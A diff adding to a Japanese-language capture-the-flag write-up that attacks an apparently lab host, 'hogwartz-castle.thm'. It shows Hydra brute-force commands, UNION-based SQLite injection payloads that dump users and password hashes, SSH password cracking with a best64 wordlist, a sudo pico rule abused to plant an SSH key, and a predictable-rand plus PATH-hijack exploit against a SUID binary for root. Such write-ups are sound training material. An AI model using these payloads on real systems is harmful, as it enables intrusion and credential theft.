@@ -181,3 +181,245 @@ Hermonine loves historical text editors along with reading old books.
 そもそも、http://hogwartz-castle.thm/ にアクセスするとサーバー内部エラー500が表示されている。Discordでほかのユーザーも同じ現象を報告しており、ルームバグと思われる。
 
 # 進行不能バグのため中断
+
+2026/03/08 試したら http://hogwartz-castle.thm/ を表示できたので再開。
+
+パスワードブルートフォース。ヒットしなかった。
+
+```sh
+$ cat users.txt 
+hagrid
+hermonine
+madeye
+roar
+echo
+rme
+RME
+may
+
+$ hydra hogwartz-castle.thm http-post-form "/login:user=^USER^&password=^PASS:Incorrect Username or Password" -L users.txt -P spellnames.txt -t 30
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-07 20:35:32
+[DATA] max 30 tasks per 1 server, overall 30 tasks, 729 login tries (l:9/p:81), ~25 tries per task
+[DATA] attacking http-post-form://hogwartz-castle.thm:80/login:user=^USER^&password=^PASS:Incorrect Username or Password
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-07 20:35:52
+```
+
+nameに対してSQLインジェクションを試したら下記エラーが出た。
+
+```
+{"error":"The password for Lucas Washington is incorrect! contact administrator. Congrats on SQL injection... keep digging"}
+```
+
+このユーザーを足してもブルートフォース失敗。
+
+## SQLi
+
+usersテーブル
+
+```
+user=a' union select tbl_name,2,3,4 FROM sqlite_master WHERE type='table'--&password=aaa
+
+"The password for users is incorrect! 4"
+```
+
+usersテーブルの定義
+
+```
+user=a' union select sql,2,3,4 FROM sqlite_master WHERE type<>'meta' AND sql NOT NULL AND name ='users'----&password=aaa
+
+"The password for CREATE TABLE users(\nname text not null,\npassword text not null,\nadmin int not null,\nnotes text not null) is incorrect! 4"
+```
+
+ユーザー名とパスワード
+
+```
+user=a' union select name,2,3,4 FROM users--&password=aaa
+
+"The password for Aaliyah Allen is incorrect! 4"
+```
+
+```
+user=a' union select password,2,3,4 FROM users--&password=aaa
+
+"The password for 01529ec5cb2c6b0300ed8f4f3df6b282c1a68c45ff97c33d52007573774014d3f01a293a06b1f0f3eb6e90994cb2a7528d345a266203ef4cd3d9434a3a033ec0 is incorrect! 4"
+```
+
+ユーザーリスト
+
+```
+user=a' union select group_concat(name),2,3,4 FROM users--&password=aaa
+
+"The password for Lucas Washington,Harry Turner,Andrea Phillips,Liam Hernandez,Adam Jenkins,Landon Alexander,Kennedy Anderson,Sydney Wright,Aaliyah Sanders,Olivia Murphy,Olivia Ross,Grace Brooks,Jordan White,Diego Baker,Liam Ward,Carlos Barnes,Carlos Lopez,Oliver Gonzalez,Sophie Sanchez,Maya Sanders,Joshua Reed,Aaliyah Allen,Jasmine King,Jonathan Long,Samuel Anderson,Julian Robinson,Gianna Harris,Madelyn Morgan,Ella Garcia,Zoey Gonzales,Abigail Morgan,Joseph Rivera,Elizabeth Cook,Parker Cox,Savannah Torres,Aaliyah Williams,Blake Washington,Claire Miller,Brody Stewart,Kimberly Murphy is incorrect! 4"
+```
+
+notes
+
+```
+"The password for contact administrator. Congrats on SQL injection... keep digging:My linux username is my first name, and password uses best64: contact administrator. Congrats on SQL injection... keep digging:contact administrator. Congrats on SQL injection... keep digging:contact 
+......
+```
+
+2人目（Harry Turner）のLinuxユーザー名がファーストネームで、best64を使っている。
+
+## SSH
+
+スペルリストにbase64適用。
+
+```sh
+$ john --wordlist=spellnames.txt --rules=best64 --stdout > b64spell.txt
+```
+
+ブルートフォース成功！
+
+```sh
+$ hydra -l harry -P b64spell.txt $TARGET ssh -t 30
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-07 21:33:09
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 30 tasks per 1 server, overall 30 tasks, 6103 login tries (l:1/p:6103), ~204 tries per task
+[DATA] attacking ssh://10.48.164.54:22/
+[STATUS] 385.00 tries/min, 385 tries in 00:01h, 5725 to do in 00:15h, 23 active
+[STATUS] 366.67 tries/min, 1100 tries in 00:03h, 5010 to do in 00:14h, 23 active
+[22][ssh] host: 10.48.164.54   login: harry   password: [REDACTED]
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 7 final worker threads did not complete until end.
+[ERROR] 7 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-07 21:39:38
+```
+
+## 権限昇格１
+
+pico は nano のエイリアス。
+
+```sh
+harry@ip-10-48-164-54:~$ sudo -l
+[sudo] password for harry: 
+Matching Defaults entries for harry on ip-10-48-164-54:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User harry may run the following commands on ip-10-48-164-54:
+    (hermonine) /usr/bin/pico
+    (hermonine) /usr/bin/pico
+```
+
+公開鍵を書き込んでSSH奪取。
+
+```sh
+harry@ip-10-48-164-54:~$ sudo -u hermonine /usr/bin/pico /home/hermonine/.ssh/authorized_keys
+```
+
+## 権限昇格２
+
+pwn の痕跡
+
+```sh
+hermonine@ip-10-48-164-54:~$ cat .python_history
+import pwn
+exit()
+import pwn
+exit()
+```
+
+見慣れないSUIDバイナリ
+
+```sh
+hermonine@ip-10-48-164-54:~$ find / -perm -u=s -type f -ls 2>/dev/null
+   401381     12 -rwsr-xr-x   1 root     root         8816 Nov 26  2020 /srv/time-turner/swagger
+```
+
+ghidra でリバース
+
+```c
+undefined8 main(void)
+{
+  time_t tVar1;
+  long in_FS_OFFSET;
+  uint local_18;
+  uint local_14;
+  long local_10;
+  
+  local_10 = *(long *)(in_FS_OFFSET + 0x28);
+  tVar1 = time((time_t *)0x0);
+  srand((uint)tVar1);
+  local_14 = rand();
+  printf("Guess my number: ");
+  __isoc99_scanf(&DAT_00100b8d,&local_18);
+  if (local_14 == local_18) {
+    impressive();
+  }
+  else {
+    puts("Nope, that is not what I was thinking");
+    printf("I was thinking of %d\n",(ulong)local_14);
+  }
+  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
+                    /* WARNING: Subroutine does not return */
+    __stack_chk_fail();
+  }
+  return 0;
+}
+
+void impressive(void)
+{
+  setregid(0,0);
+  setreuid(0,0);
+  puts("Nice use of the time-turner!");
+  printf("This system architecture is ");
+  fflush(stdout);
+  system("uname -p");
+  return;
+}
+```
+
+最初、バッファオーバーフローかと思ったがうまくいかなかった。
+
+```sh
+hermonine@ip-10-48-164-54:~$ { python2 -c 'print "0" * 8'; cat; } | /srv/time-turner/swagger
+Guess my number: Nope, that is not what I was thinking
+I was thinking of 1151327652
+```
+
+- scanf は "%d" で実行されておりバッファオーバーフローの脆弱性ではない
+- 乱数のシードが固定
+- uname が相対パスのためbashに置き換えたらrootシェルを取れる
+
+timeの解像度は秒単位なので srand(time(NULL))の値を出力するプログラムを作る。
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <time.h>
+
+int main() {
+    srand(time(NULL));
+    printf("%d\n", rand());
+    return 0;
+}
+```
+
+エクスプロイト
+
+```sh
+hermonine@ip-10-48-164-54:~$ cp /bin/bash ./
+hermonine@ip-10-48-164-54:~$ mv ./bash ./uname
+hermonine@ip-10-48-164-54:~$ PATH=/home/hermonine:$PATH
+
+hermonine@ip-10-48-164-54:~$ { ./get_rand; cat; } | /srv/time-turner/swagger
+Guess my number: Nice use of the time-turner!
+This system architecture is id
+uid=0(root) gid=0(root) groups=0(root),1002(hermonine)
+```
+
+## 振り返り
+
+- SQLインジェクションからヒントを読み取るのは予測しにくい構造
+
+## Tags
+
+#tags:SQLインジェクション #tags:Pwn
